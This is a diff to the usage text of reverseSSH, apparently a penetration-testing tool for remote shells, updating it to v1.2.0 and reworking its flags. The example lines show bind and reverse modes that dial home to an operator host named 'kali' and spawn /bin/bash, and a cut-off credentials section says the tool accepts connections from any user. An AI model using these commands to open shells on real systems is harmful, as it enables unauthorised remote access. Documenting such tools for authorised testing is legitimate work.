@@ -117,14 +117,14 @@ Host target
 ### Full usage
 
 ```
-reverseSSH v1.1.0  Copyright (C) 2021  Ferdinor <ferdinor@mailbox.org>
+reverseSSH v1.2.0  Copyright (C) 2021  Ferdinor <ferdinor@mailbox.org>
 
-Usage: reverse-ssh [options] [<user>@]<target>
+Usage: reverse-ssh [options] [[<user>@]<target>]
 
 Examples:
   Bind:
-        reverse-ssh
-        reverse-ssh -v -l :4444
+        reverse-ssh -l
+        reverse-ssh -v -l -p 4444
   Reverse:
         reverse-ssh 192.168.0.1
         reverse-ssh kali@192.168.0.1
@@ -132,17 +132,18 @@ Examples:
         reverse-ssh -v -b 0 kali@192.168.0.2
 
 Options:
-        -s, Shell to use for incoming connections, e.g. /bin/bash; (default: /bin/bash)
+        -l, Start reverseSSH in listening mode (overrides reverse scenario)
+        -p, Port at which reverseSSH is listening for incoming ssh connections (bind scenario)
+                or where it tries to establish a ssh connection (reverse scenario) (default: 31337)
+        -b, Reverse scenario only: bind to this port after dialling home (default: 8888)
+        -s, Shell to spawn for incoming connections, e.g. /bin/bash; (default: /bin/bash)
                 for windows this can only be used to give a path to 'ssh-shellhost.exe' to
                 enhance pre-Windows10 shells (e.g. '-s ssh-shellhost.exe' if in same directory)
-        -l, Bind scenario only: listen at this address:port (default: :31337)
-        -p, Reverse scenario only: ssh port at home (default: 22)
-        -b, Reverse scenario only: bind to this port after dialling home (default: 8888)
         -v, Emit log output
 
 <target>
         Optional target which enables the reverse scenario. Can be prepended with
-        <user>@ to authenticate as a different user than 'reverse' while dialling home.
+        <user>@ to authenticate as a different user other than 'reverse' while dialling home
 
 Credentials:
         Accepting all incoming connections from any user with either of the following:
